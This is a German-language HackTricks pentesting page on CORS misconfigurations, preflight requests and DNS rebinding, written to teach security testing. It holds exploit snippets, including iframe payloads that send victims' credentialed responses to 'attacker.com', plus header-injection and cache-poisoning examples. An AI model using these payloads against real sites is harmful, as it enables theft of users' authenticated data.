# CORS - Fehlkonfigurationen & Umgehung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Was ist CORS?

Cross-Origin Resource Sharing (CORS) Standard **erm√∂glicht es Servern festzulegen, wer auf ihre Ressourcen zugreifen kann** und **welche HTTP-Anforderungsmethoden von externen Quellen erlaubt sind**.

Eine **Same-Origin**-Richtlinie schreibt vor, dass ein **Server, der eine Ressource anfordert**, und der Server, der die **Ressource hostet**, das gleiche Protokoll (z. B. `http://`), den gleichen Domainnamen (z. B. `internal-web.com`) und **Port** (z. B. 80) teilen. Unter dieser Richtlinie haben nur Webseiten aus der gleichen Dom√§ne und dem gleichen Port Zugriff auf die Ressourcen.

Die Anwendung der Same-Origin-Richtlinie im Kontext von `http://normal-website.com/example/example.html` wird wie folgt dargestellt:

| Aufgerufene URL                           | Zugriff erlaubt?                        |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Ja: Identisches Schema, Dom√§ne und Port |
| `http://normal-website.com/example2/`     | Ja: Identisches Schema, Dom√§ne und Port |
| `https://normal-website.com/example/`     | Nein: Unterschiedliches Schema und Port |
| `http://en.normal-website.com/example/`   | Nein: Unterschiedliche Dom√§ne           |
| `http://www.normal-website.com/example/`  | Nein: Unterschiedliche Dom√§ne           |
| `http://normal-website.com:8080/example/` | Nein: Unterschiedlicher Port\*          |

\*Internet Explorer ignoriert die Portnummer bei der Durchsetzung der Same-Origin-Richtlinie und erlaubt somit diesen Zugriff.

### `Access-Control-Allow-Origin`-Header

Dieser Header kann **mehrere Urspr√ºnge**, einen **`null`**-Wert oder ein Wildcard **`*`** zulassen. Kein Browser unterst√ºtzt jedoch **mehrere Urspr√ºnge**, und die Verwendung des Wildcards `*` unterliegt **Einschr√§nkungen**. (Die Wildcard muss alleine verwendet werden, und ihre Verwendung zusammen mit `Access-Control-Allow-Credentials: true` ist nicht erlaubt.)

Dieser Header wird **von einem Server** als Antwort auf eine von einer Website initiierte Anforderung einer Ressource aus einer anderen Dom√§ne ausgegeben, wobei der Browser automatisch einen `Origin`-Header hinzuf√ºgt.

### `Access-Control-Allow-Credentials`-Header

Standardm√§√üig werden Cross-Origin-Anfragen ohne Anmeldeinformationen wie Cookies oder dem Autorisierungsheader durchgef√ºhrt. Ein Server in einer anderen Dom√§ne kann jedoch das Lesen der Antwort erlauben, wenn Anmeldeinformationen gesendet werden, indem der `Access-Control-Allow-Credentials`-Header auf **`true`** gesetzt wird.

Wenn auf `true` gesetzt, √ºbertr√§gt der Browser Anmeldeinformationen (Cookies, Autorisierungsheader oder TLS-Clientzertifikate).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-Fluganfrage

### Verst√§ndnis von Pre-Flight-Anfragen in der Cross-Domain-Kommunikation

Bei der Initiierung einer Cross-Domain-Anfrage unter spezifischen Bedingungen, wie der Verwendung einer **nicht standardm√§√üigen HTTP-Methode** (alles au√üer HEAD, GET, POST), der Einf√ºhrung neuer **Header** oder der Verwendung eines speziellen **Content-Type-Headerwerts**, kann eine Pre-Flight-Anfrage erforderlich sein. Diese vorl√§ufige Anfrage, die die Methode **`OPTIONS`** nutzt, dient dazu, den Server √ºber die Absichten der bevorstehenden Cross-Origin-Anfrage zu informieren, einschlie√ülich der HTTP-Methoden und Header, die sie verwenden m√∂chte.

Das **Cross-Origin Resource Sharing (CORS)**-Protokoll schreibt diese Pre-Flight-√úberpr√ºfung vor, um die Machbarkeit der angeforderten Cross-Origin-Operation zu bestimmen, indem die erlaubten Methoden, Header und die Vertrauensw√ºrdigkeit des Ursprungs √ºberpr√ºft werden. F√ºr ein detailliertes Verst√§ndnis dar√ºber, welche Bedingungen die Notwendigkeit einer Pre-Flight-Anfrage umgehen, siehe den umfassenden Leitfaden von der [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Es ist wichtig zu beachten, dass das **Fehlen einer Pre-Flight-Anfrage nicht die Notwendigkeit aufhebt, dass die Antwort Autorisierungsheader enth√§lt**. Ohne diese Header ist der Browser nicht in der Lage, die Antwort der Cross-Origin-Anfrage zu verarbeiten.

Betrachten Sie die folgende Darstellung einer Pre-Flight-Anfrage, die darauf abzielt, die `PUT`-Methode zusammen mit einem benutzerdefinierten Header namens `Special-Request-Header` zu verwenden:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
In der Antwort k√∂nnte der Server Header zur√ºckgeben, die die akzeptierten Methoden, den erlaubten Ursprung und andere CORS-Richtliniendetails anzeigen, wie unten dargestellt:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Dieser Header gibt an, welche Header w√§hrend des eigentlichen Requests verwendet werden k√∂nnen. Er wird vom Server gesetzt, um die erlaubten Header in Anfragen vom Client anzugeben.
* **`Access-Control-Expose-Headers`**: Durch diesen Header informiert der Server den Client dar√ºber, welche Header neben den einfachen Antwort-Headern als Teil der Antwort freigegeben werden k√∂nnen.
* **`Access-Control-Max-Age`**: Dieser Header gibt an, wie lange die Ergebnisse einer Pre-Flight-Anfrage zwischengespeichert werden k√∂nnen. Der Server legt die maximale Zeit in Sekunden fest, die die Informationen, die von einer Pre-Flight-Anfrage zur√ºckgegeben werden, wiederverwendet werden k√∂nnen.
* **`Access-Control-Request-Headers`**: In Pre-Flight-Anfragen verwendet, wird dieser Header vom Client gesetzt, um den Server dar√ºber zu informieren, welche HTTP-Header der Client im eigentlichen Request verwenden m√∂chte.
* **`Access-Control-Request-Method`**: Dieser Header, ebenfalls in Pre-Flight-Anfragen verwendet, wird vom Client gesetzt, um anzuzeigen, welcher HTTP-Methoden im eigentlichen Request verwendet wird.
* **`Origin`**: Dieser Header wird automatisch vom Browser gesetzt und gibt den Ursprung der Cross-Origin-Anfrage an. Er wird vom Server verwendet, um zu beurteilen, ob die eingehende Anfrage basierend auf der CORS-Richtlinie erlaubt oder verweigert werden soll.

Beachten Sie, dass normalerweise (abh√§ngig vom Content-Type und den gesetzten Headern) bei einer **GET/POST-Anfrage keine Pre-Flight-Anfrage gesendet wird** (die Anfrage wird **direkt** gesendet), aber wenn Sie auf die **Header/Body der Antwort zugreifen m√∂chten**, muss sie einen _Access-Control-Allow-Origin_ Header enthalten, der dies erlaubt.\
**Daher sch√ºtzt CORS nicht vor CSRF (kann aber hilfreich sein).**

### **Pre-Flight-Anfrage f√ºr lokale Netzwerkanfragen**

1. **`Access-Control-Request-Local-Network`**: Dieser Header ist in der Anfrage des Clients enthalten, um anzuzeigen, dass die Anfrage auf eine lokale Netzwerkressource abzielt. Er dient als Kennzeichnung, um den Server dar√ºber zu informieren, dass die Anfrage aus dem lokalen Netzwerk stammt.
2. **`Access-Control-Allow-Local-Network`**: Als Antwort verwenden Server diesen Header, um mitzuteilen, dass die angeforderte Ressource f√ºr die Freigabe mit Entit√§ten au√üerhalb des lokalen Netzwerks zugelassen ist. Er fungiert als gr√ºnes Licht f√ºr den Austausch von Ressourcen √ºber verschiedene Netzwerkgrenzen hinweg, um kontrollierten Zugriff zu gew√§hrleisten und gleichzeitig Sicherheitsprotokolle einzuhalten.

Eine **g√ºltige Antwort, die die lokale Netzwerkanfrage erlaubt**, muss auch in der Antwort den Header `Access-Controls-Allow-Local_network: true` enthalten:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Beachten Sie, dass die Linux-IP **0.0.0.0** verwendet werden kann, um diese Anforderungen zu umgehen und auf localhost zuzugreifen, da diese IP-Adresse nicht als "lokal" betrachtet wird.

Es ist auch m√∂glich, die Anforderungen des lokalen Netzwerks zu umgehen, wenn Sie die **√∂ffentliche IP-Adresse eines lokalen Endpunkts** verwenden (wie die √∂ffentliche IP des Routers). Denn in mehreren F√§llen wird selbst wenn auf die **√∂ffentliche IP** zugegriffen wird, wenn es **aus dem lokalen Netzwerk** stammt, der Zugriff gew√§hrt.
{% endhint %}

## Ausnutzbare Fehlkonfigurationen

Es wurde beobachtet, dass die Einstellung von `Access-Control-Allow-Credentials` auf **`true`** eine Voraussetzung f√ºr die meisten **echten Angriffe** darstellt. Diese Einstellung erlaubt es dem Browser, Anmeldeinformationen zu senden und die Antwort zu lesen, was die Effektivit√§t des Angriffs erh√∂ht. Ohne dies nimmt der Vorteil, den ein Browser eine Anfrage auszul√∂sen gegen√ºber dem manuellen Ausf√ºhren hat, ab, da das Ausnutzen von Benutzercookies unpraktikabel wird.

### Ausnahme: Ausnutzung des Netzwerkstandorts als Authentifizierung

Eine Ausnahme besteht, wenn der Netzwerkstandort des Opfers als Form der Authentifizierung fungiert. Dies erm√∂glicht es dem Browser des Opfers, als Proxy verwendet zu werden, um die IP-basierte Authentifizierung zu umgehen und auf Intranet-Anwendungen zuzugreifen. Diese Methode weist √Ñhnlichkeiten mit DNS-Rebinding auf, ist jedoch einfacher auszunutzen.

### Reflektion von `Origin` in `Access-Control-Allow-Origin`

Das Szenario in der realen Welt, in dem der Wert des `Origin`-Headers in `Access-Control-Allow-Origin` reflektiert wird, ist theoretisch unwahrscheinlich aufgrund von Beschr√§nkungen bei der Kombination dieser Header. Entwickler, die CORS f√ºr mehrere URLs aktivieren m√∂chten, k√∂nnen jedoch den `Access-Control-Allow-Origin`-Header dynamisch generieren, indem sie den Wert des `Origin`-Headers kopieren. Dieser Ansatz kann Sicherheitsl√ºcken einf√ºhren, insbesondere wenn ein Angreifer eine Domain verwendet, die so gestaltet ist, dass sie legitim erscheint, und damit die Validierungslogik t√§uscht.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Ausnutzen des `null` Ursprungs

Der `null` Ursprung, der f√ºr Situationen wie Weiterleitungen oder lokale HTML-Dateien spezifiziert ist, nimmt eine einzigartige Position ein. Einige Anwendungen setzen diesen Ursprung auf die Whitelist, um die lokale Entwicklung zu erleichtern, wodurch sie versehentlich jeder Website erm√∂glichen, einen `null` Ursprung durch ein sandboxed iframe zu imitieren und somit die CORS-Beschr√§nkungen zu umgehen.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Regul√§re Ausdruck-Bypass-Techniken

Beim Auffinden einer Domain-Whitelist ist es entscheidend, nach Umgehungsm√∂glichkeiten zu testen, wie das Anh√§ngen der Domain des Angreifers an eine whitelisted Domain oder die Ausnutzung von Schwachstellen bei der √úbernahme von Subdomains. Dar√ºber hinaus k√∂nnen bei der Verwendung von regul√§ren Ausdr√ºcken zur Dom√§nenvalidierung Nuancen in den Dom√§nennamenskonventionen √ºbersehen werden, was weitere Umgehungsm√∂glichkeiten bietet.

### Fortgeschrittene Regul√§re Ausdruck-Bypasses

RegEx-Muster konzentrieren sich typischerweise auf alphanumerische, Punkt (.) und Bindestrich (-) Zeichen und vernachl√§ssigen andere M√∂glichkeiten. Zum Beispiel kann ein Domainname so gestaltet sein, dass er Zeichen enth√§lt, die von Browsern und RegEx-Mustern unterschiedlich interpretiert werden und Sicherheits√ºberpr√ºfungen umgehen k√∂nnen. Safaris, Chromes und Firefox' Umgang mit Unterstrichzeichen in Subdomains verdeutlicht, wie solche Unterschiede ausgenutzt werden k√∂nnen, um die Dom√§nenvalidierungslogik zu umgehen.

**F√ºr weitere Informationen und Einstellungen dieses Bypass-Checks:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **und** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### Von XSS innerhalb einer Subdomain

Entwickler implementieren oft Abwehrmechanismen, um sich vor CORS-Exploitation zu sch√ºtzen, indem sie Domains auf diejenigen beschr√§nken, die berechtigt sind, Informationen anzufordern. Trotz dieser Vorsichtsma√ünahmen ist die Sicherheit des Systems nicht narrensicher. Das Vorhandensein auch nur einer anf√§lligen Subdomain innerhalb der whitelisted Domains kann die T√ºr zur CORS-Exploitation durch andere Schwachstellen √∂ffnen, wie z.B. XSS (Cross-Site Scripting).

Um dies zu verdeutlichen, betrachten Sie das Szenario, in dem eine Domain, `requester.com`, auf Ressourcen einer anderen Domain, `provider.com`, zugreifen darf. Die serverseitige Konfiguration k√∂nnte so aussehen:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
In diesem Setup haben alle Subdomains von `requester.com` Zugriff. Wenn jedoch eine Subdomain, z. B. `sub.requester.com`, durch eine XSS-Schwachstelle kompromittiert ist, kann ein Angreifer diese Schwachstelle ausnutzen. Ein Angreifer mit Zugriff auf `sub.requester.com` k√∂nnte beispielsweise die XSS-Schwachstelle ausnutzen, um CORS-Richtlinien zu umgehen und b√∂swillig auf Ressourcen auf `provider.com` zuzugreifen.

### **Serverseitige Cache-Vergiftung**

[**Aus dieser Forschung**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Es ist m√∂glich, dass durch Ausnutzen einer serverseitigen Cache-Vergiftung durch HTTP-Header-Injektion eine gespeicherte Cross-Site-Scripting (XSS)-Schwachstelle induziert werden kann. Dieses Szenario entfaltet sich, wenn eine Anwendung den `Origin`-Header nicht auf illegale Zeichen √ºberpr√ºft, was insbesondere f√ºr Internet Explorer- und Edge-Benutzer eine Schwachstelle schafft. Diese Browser behandeln (0x0d) als legitimen HTTP-Header-Terminator, was zu HTTP-Header-Injektionsschwachstellen f√ºhrt.

Betrachten Sie die folgende Anfrage, bei der der `Origin`-Header manipuliert wird:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer und Edge interpretieren die Antwort als:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
W√§hrend es nicht m√∂glich ist, diese Schwachstelle direkt auszunutzen, indem ein Webbrowser einen fehlerhaften Header sendet, kann eine manipulierte Anfrage manuell mithilfe von Tools wie Burp Suite generiert werden. Diese Methode k√∂nnte dazu f√ºhren, dass ein serverseitiger Cache die Antwort speichert und sie unbeabsichtigt an andere weitergibt. Das manipulierte Payload zielt darauf ab, den Zeichensatz der Seite in UTF-7 zu √§ndern, eine Zeichenkodierung, die aufgrund ihrer F√§higkeit, Zeichen auf eine Weise zu kodieren, die in bestimmten Kontexten als Skript ausgef√ºhrt werden kann, oft mit XSS-Schwachstellen in Verbindung gebracht wird.

F√ºr weitere Informationen zu gespeicherten XSS-Schwachstellen siehe [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Hinweis**: Die Ausnutzung von HTTP-Header-Injektionsschwachstellen, insbesondere durch serverseitiges Caching-Vergiften, unterstreicht die entscheidende Bedeutung der Validierung und S√§uberung aller vom Benutzer bereitgestellten Eingaben, einschlie√ülich der HTTP-Header. Verwenden Sie immer ein robustes Sicherheitsmodell, das eine Eingabevalidierung umfasst, um solche Schwachstellen zu verhindern.

### **Clientseitiges Caching-Vergiften**

[**Aus dieser Forschung**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

In diesem Szenario wird eine Instanz einer Webseite beobachtet, die den Inhalt eines benutzerdefinierten HTTP-Headers ohne ordnungsgem√§√üe Codierung widerspiegelt. Speziell gibt die Webseite den Inhalt eines `X-User-id`-Headers zur√ºck, der b√∂sartiges JavaScript enthalten k√∂nnte, wie im Beispiel gezeigt, in dem der Header ein SVG-Bildtag enth√§lt, das darauf ausgelegt ist, beim Laden JavaScript-Code auszuf√ºhren.

Cross-Origin Resource Sharing (CORS)-Richtlinien erm√∂glichen das Senden von benutzerdefinierten Headern. Ohne dass die Antwort aufgrund von CORS-Beschr√§nkungen direkt vom Browser gerendert wird, k√∂nnte die N√ºtzlichkeit einer solchen Injektion begrenzt erscheinen. Der kritische Punkt ergibt sich beim Betrachten des Browser-Cache-Verhaltens. Wenn der `Vary: Origin`-Header nicht angegeben ist, wird es m√∂glich, dass die b√∂sartige Antwort vom Browser zwischengespeichert wird. Anschlie√üend k√∂nnte diese zwischengespeicherte Antwort direkt gerendert werden, wenn die URL aufgerufen wird, ohne dass eine direkte Rendervorgang bei der urspr√ºnglichen Anfrage erforderlich ist. Dieser Mechanismus verbessert die Zuverl√§ssigkeit des Angriffs durch Nutzung des clientseitigen Cachings.

Um diesen Angriff zu veranschaulichen, wird ein JavaScript-Beispiel bereitgestellt, das darauf ausgelegt ist, in der Umgebung einer Webseite ausgef√ºhrt zu werden, beispielsweise √ºber ein JSFiddle. Dieses Skript f√ºhrt eine einfache Aktion aus: Es sendet eine Anfrage an eine angegebene URL mit einem benutzerdefinierten Header, der das b√∂sartige JavaScript enth√§lt. Nach erfolgreicher Anfrage versucht es, zur Ziel-URL zu navigieren, was potenziell die Ausf√ºhrung des injizierten Skripts ausl√∂sen k√∂nnte, wenn die Antwort zwischengespeichert wurde, ohne ordnungsgem√§√üe Behandlung des `Vary: Origin`-Headers.

Hier ist eine zusammengefasste Aufschl√ºsselung des verwendeten JavaScripts, um diesen Angriff auszuf√ºhren:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Umgehen

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, auch bekannt als Cross-Site Script Inclusion, ist ein Typ von Schwachstelle, der ausnutzt, dass die Same Origin Policy (SOP) nicht angewendet wird, wenn Ressourcen mittels des script-Tags inkludiert werden. Dies liegt daran, dass Skripte von verschiedenen Domains inkludiert werden k√∂nnen m√ºssen. Diese Schwachstelle erlaubt einem Angreifer auf jeglichen Inhalt zuzugreifen und diesen zu lesen, der mittels des script-Tags inkludiert wurde.

Diese Schwachstelle wird besonders signifikant, wenn es um dynamisches JavaScript oder JSONP (JSON mit Padding) geht, insbesondere wenn Umgebungsautorit√§tsinformationen wie Cookies f√ºr die Authentifizierung verwendet werden. Beim Anfordern einer Ressource von einem anderen Host werden die Cookies inkludiert, was sie f√ºr den Angreifer zug√§nglich macht.

Um diese Schwachstelle besser zu verstehen und zu mildern, kannst du das BurpSuite-Plugin verwenden, das unter [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) verf√ºgbar ist. Dieses Plugin kann helfen, potenzielle XSSI-Schwachstellen in deinen Webanwendungen zu identifizieren und anzugehen.

[**Erfahre mehr √ºber die verschiedenen Arten von XSSI und wie man sie ausnutzen kann hier.**](xssi-cross-site-script-inclusion.md)

Versuche einen **`callback`** **Parameter** in der Anfrage hinzuzuf√ºgen. M√∂glicherweise wurde die Seite darauf vorbereitet, die Daten als JSONP zu senden. In diesem Fall wird die Seite die Daten mit `Content-Type: application/javascript` zur√ºcksenden, was die CORS-Richtlinie umgeht.

![](<../.gitbook/assets/image (856).png>)

### Einfacher (nutzloser?) Umgehung

Eine M√∂glichkeit, die `Access-Control-Allow-Origin`-Einschr√§nkung zu umgehen, besteht darin, eine Webanwendung aufzufordern, eine Anfrage in deinem Namen zu stellen und die Antwort zur√ºckzusenden. In diesem Szenario werden jedoch die Anmeldeinformationen des endg√ºltigen Opfers nicht gesendet, da die Anfrage an eine andere Domain gestellt wird.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Dieses Tool bietet einen Proxy, der deine Anfrage zusammen mit ihren Headern weiterleitet und gleichzeitig den Origin-Header f√§lscht, um mit der angeforderten Domain √ºbereinzustimmen. Dies umgeht effektiv die CORS-Richtlinie. Hier ist ein Beispiel f√ºr die Verwendung mit XMLHttpRequest:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Dieses Tool bietet einen alternativen Ansatz zum Weiterleiten von Anfragen. Anstatt deine Anfrage wie sie ist weiterzuleiten, macht der Server seine eigene Anfrage mit den angegebenen Parametern.

### Iframe + Popup Umgehung

Du kannst **CORS-Pr√ºfungen umgehen** wie `e.origin === window.origin`, indem du ein **Iframe erstellst** und **daraus ein neues Fenster √∂ffnest**. Weitere Informationen findest du auf der folgenden Seite:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS-Rebinding √ºber TTL

DNS-Rebinding √ºber TTL ist eine Technik, die verwendet wird, um bestimmte Sicherheitsma√ünahmen zu umgehen, indem DNS-Eintr√§ge manipuliert werden. So funktioniert es:

1. Der Angreifer erstellt eine Webseite und l√§sst das Opfer darauf zugreifen.
2. Der Angreifer √§ndert dann die DNS (IP) seiner eigenen Domain, um auf die Webseite des Opfers zu verweisen.
3. Der Browser des Opfers zwischenspeichert die DNS-Antwort, die m√∂glicherweise einen TTL (Time to Live) Wert hat, der angibt, wie lange der DNS-Eintrag als g√ºltig betrachtet werden soll.
4. Wenn der TTL abl√§uft, macht der Browser des Opfers eine neue DNS-Anfrage, was es dem Angreifer erm√∂glicht, JavaScript-Code auf der Seite des Opfers auszuf√ºhren.
5. Indem der Angreifer die Kontrolle √ºber die IP des Opfers beh√§lt, kann er Informationen vom Opfer sammeln, ohne Cookies an den Opferserver zu senden.

Es ist wichtig zu beachten, dass Browser Caching-Mechanismen haben, die m√∂glicherweise einen sofortigen Missbrauch dieser Technik verhindern, selbst bei niedrigen TTL-Werten.

DNS-Rebinding kann n√ºtzlich sein, um explizite IP-Pr√ºfungen des Opfers zu umgehen oder f√ºr Szenarien, in denen ein Benutzer oder Bot f√ºr eine l√§ngere Zeit auf derselben Seite bleibt, was es erm√∂glicht, dass der Cache abl√§uft.

Wenn du eine schnelle M√∂glichkeit ben√∂tigst, DNS-Rebinding zu missbrauchen, kannst du Dienste wie [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) verwenden.

Um deinen eigenen DNS-Rebinding-Server zu betreiben, kannst du Tools wie **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) nutzen. Dies beinhaltet das Freigeben deines lokalen Ports 53/udp, das Erstellen eines A-Eintrags, der darauf zeigt (z. B. ns.example.com), und das Erstellen eines NS-Eintrags, der auf den zuvor erstellten A-Subdomain zeigt (z. B. ns.example.com). Jede Subdomain der ns.example.com-Subdomain wird dann von deinem Host aufgel√∂st.

Du kannst auch einen √∂ffentlich laufenden Server unter [http://rebind.it/singularity.html](http://rebind.it/singularity.html) erkunden, um ein besseres Verst√§ndnis und Experimente durchzuf√ºhren.

### DNS-Rebinding √ºber **DNS-Cache-Fluten**

DNS-Rebinding √ºber DNS-Cache-Fluten ist eine weitere Technik, die verwendet wird, um den Caching-Mechanismus von Browsern zu umgehen und eine zweite DNS-Anfrage zu erzwingen. So funktioniert es:

1. Zun√§chst, wenn das Opfer eine DNS-Anfrage stellt, wird mit der IP-Adresse des Angreifers geantwortet.
2. Um die Caching-Verteidigung zu umgehen, nutzt der Angreifer einen Service Worker. Der Service Worker flutet den DNS-Cache, was effektiv den gecachten Angreifer-Servernamen l√∂scht.
3. Wenn der Browser des Opfers eine zweite DNS-Anfrage stellt, wird nun mit der IP-Adresse 127.0.0.1 geantwortet, die normalerweise auf den localhost verweist.

Durch Fluten des DNS-Caches mit dem Service Worker kann der Angreifer den DNS-Aufl√∂sungsprozess manipulieren und den Browser des Opfers zwingen, eine zweite Anfrage zu stellen, die dieses Mal auf die gew√ºnschte IP-Adresse des Angreifers verweist.

### DNS-Rebinding √ºber **Cache**

Eine weitere M√∂glichkeit, die Caching-Verteidigung zu umgehen, besteht darin, mehrere IP-Adressen f√ºr dieselbe Subdomain beim DNS-Anbieter zu nutzen. So funktioniert es:

1. Der Angreifer richtet zwei A-Eintr√§ge (oder einen einzelnen A-Eintrag mit zwei IPs) f√ºr dieselbe Subdomain beim DNS-Anbieter ein.
2. Wenn ein Browser diese Eintr√§ge √ºberpr√ºft, erh√§lt er beide IP-Adressen.
3. Wenn der Browser sich entscheidet, zuerst die IP-Adresse des Angreifers zu verwenden, kann der Angreifer eine Nutzlast bereitstellen, die HTTP-Anfragen an dieselbe Domain durchf√ºhrt.
4. Sobald der Angreifer jedoch die IP-Adresse des Opfers erh√§lt, h√∂rt er auf, auf den Browser des Opfers zu antworten.
5. Der Browser des Opfers, nachdem er feststellt, dass die Domain nicht reagiert, wechselt zur Verwendung der zweiten gegebenen IP-Adresse.
6. Durch den Zugriff auf die zweite IP-Adresse umgeht der Browser die Same Origin Policy (SOP), was es dem Angreifer erm√∂glicht, dies auszunutzen und Informationen vom Opfer zu sammeln und zu exfiltrieren.

Diese Technik nutzt das Verhalten von Browsern aus, wenn mehrere IP-Adressen f√ºr eine Domain bereitgestellt werden. Indem die Antworten strategisch kontrolliert und die Wahl der IP-Adresse des Browsers manipuliert wird, kann ein Angreifer die SOP ausnutzen und Informationen vom Opfer abrufen.

{% hint style="warning" %}
Beachte, dass du, um auf localhost zuzugreifen, versuchen solltest, **127.0.0.1** in Windows und **0.0.0.0** in Linux zur√ºckzubinden.\
Anbieter wie Godaddy oder Cloudflare haben es mir nicht erlaubt, die IP 0.0.0.0 zu verwenden, aber AWS Route53 hat es mir erlaubt, einen A-Eintrag mit 2 IPs zu erstellen, wobei eine davon "0.0.0.0" ist.

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

F√ºr weitere Informationen kannst du [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/) √ºberpr√ºfen.
### Andere h√§ufige Umgehungen

* Wenn **interne IPs nicht erlaubt sind**, k√∂nnten sie **vergessen haben, 0.0.0.0 zu verbieten** (funktioniert auf Linux und Mac)
* Wenn **interne IPs nicht erlaubt sind**, antworten Sie mit einem **CNAME** auf **localhost** (funktioniert auf Linux und Mac)
* Wenn **interne IPs nicht als DNS-Antworten erlaubt sind**, k√∂nnen Sie **CNAMEs auf interne Dienste** wie www.corporate.internal antworten.

### DNS-Rebinding weaponisiert

Weitere Informationen zu den vorherigen Umgehungstechniken und zur Verwendung des folgenden Tools finden Sie im Vortrag [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

